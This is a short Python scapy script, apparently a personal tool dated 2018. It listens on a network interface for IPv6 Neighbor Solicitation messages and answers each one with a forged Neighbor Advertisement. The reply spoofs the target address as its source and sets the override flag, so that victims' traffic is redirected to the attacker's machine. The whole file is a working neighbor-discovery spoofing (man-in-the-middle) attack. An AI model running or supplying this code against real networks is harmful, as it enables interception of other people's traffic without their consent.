#!/usr/bin/python

# Jack Cardwell
# February 12, 2018

# NOTE: requires libnet in order to receive packets
import sys
from scapy.all import *

# the main function
def handleSniff(packet):

    # checks to see if this is a neighbor solicitation message, in which case respond
    if packet.haslayer(ICMPv6ND_NS):
        ether = packet.getlayer(Ether)
        # get the IP portion of the packet
        ip = packet.getlayer(IPv6)
        # get the ICMPv6 portion of the packet
        icmp6 = packet.getlayer(ICMPv6ND_NS)

        # create a new packet that will respond to this neighbor solicitation
        response = IPv6()
        response.version = ip.version
        response.tc = ip.tc
        response.fl = ip.fl
        response.nh = 58    #ICMPV6

        # check to see if the src is :: (empty), in which case send it multicast to all nodes in the network
        if (ip.src == "::"):
            response.dst = "ff02::1"
        else:
            response.dst = ip.src
        response.src = icmp6.tgt   # spoof the source to be the destination in case the kernel error checks

        respICMPv6 = ICMPv6ND_NA()
        respICMPv6.type = 136
        respICMPv6.code = 0
        respICMPv6.R = 0
        respICMPv6.S = 0
        respICMPv6.O = 1    # set the override flag so that all packets are stored here
        respICMPv6.tgt = response.src

        # create new ethernet packet
        etherResponse =Ether(dst=ether.src)
        # create the full packet
        toSend = (etherResponse/response/respICMPv6)
        sendp(toSend)
        print("Sent Infiltration Packet")




sniff(iface = "eth0", prn = handleSniff)
